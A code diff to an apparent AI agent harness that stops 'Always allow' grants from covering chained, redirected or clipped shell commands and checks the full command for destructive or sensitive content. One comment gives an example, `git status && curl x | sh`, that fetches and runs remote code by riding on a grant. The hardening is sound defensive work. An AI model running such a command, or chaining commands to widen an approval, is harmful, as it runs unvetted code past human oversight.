@@ -67,6 +67,33 @@ export function approvalKey(tool: string, summary: string): string {
   return program ? `${tool}:${program}` : tool;
 }
 
+/** Shell syntax that runs, chains or redirects more than the one program an
+ * "Always allow" grant was keyed on: `;`, `&&`, `||`, `|`, a lone `&`,
+ * backticks, `$(`, `<`, `>`, and line breaks. `git status && curl x | sh`
+ * would otherwise inherit the `Bash:git` grant. Quoted occurrences count too:
+ * telling a harmless quoted `;` apart from a real one needs a full shell
+ * parser, and the cost of a false positive is only one extra card. */
+const SHELL_CHAINING = /[;&|`<>\r\n]|\$\(/;
+
+/** Drivers clip a command summary to 200 characters (claude.ts askSummary,
+ * acp/core.ts). A summary that long may hide the rest of the command, so a
+ * standing grant never covers it. */
+const SUMMARY_CLIP = 200;
+
+export function hasShellChaining(command: string): boolean {
+  return SHELL_CHAINING.test(command);
+}
+
+/** Whether a standing "Always allow" grant may cover this exact request.
+ * Command tools only qualify for a single, fully visible, unchained program
+ * invocation; other tools are keyed by name and unaffected. */
+export function alwaysAllowCovers(tool: string, summary: string, command?: string): boolean {
+  const bare = stripMcpToolPrefix(tool).toLowerCase();
+  if (!COMMAND_TOOLS.has(bare)) return true;
+  if (command === undefined || command !== summary || !command.trim() || summary.length >= SUMMARY_CLIP) return false;
+  return !hasShellChaining(command);
+}
+
 export interface AutoApprover {
   autoApprove?: boolean;
   alwaysAllow?: string[];
@@ -82,6 +109,8 @@ export function autoDecision(
   context?: {
     /** the turn was started by an outside event, with nobody at the keyboard */
     unattended?: boolean;
+    /** The actual complete structured invocation, not the card title. */
+    command?: string;
   },
 ): string | null {
   // Auto mode is something a person switched on for turns they are present
@@ -91,10 +120,16 @@ export function autoDecision(
   // must not stand in for a human at 3am.
   if (context?.unattended) return null;
   // the guards come first, so an "always allow" can never widen into them
-  if (looksDestructive(summary) || looksDestructive(tool)) return null;
-  if (looksSensitive(summary)) return null;
-  const key = approvalKey(tool, summary);
-  if (bot.alwaysAllow?.includes(key)) return `auto-approved ${key} (always allowed)`;
+  const command = context?.command;
+  const inspected = command ?? summary;
+  if (looksDestructive(inspected) || looksDestructive(tool)) return null;
+  if (looksSensitive(inspected)) return null;
+  const key = approvalKey(tool, inspected);
+  // A grant is keyed on one program; chaining/redirection would widen it to
+  // whatever follows, so those requests fall through to auto mode or a card.
+  if (bot.alwaysAllow?.includes(key) && alwaysAllowCovers(tool, summary, command)) {
+    return `auto-approved ${key} (always allowed)`;
+  }
   if (bot.autoApprove) return `auto-approved ${tool}`;
   return null;
 }
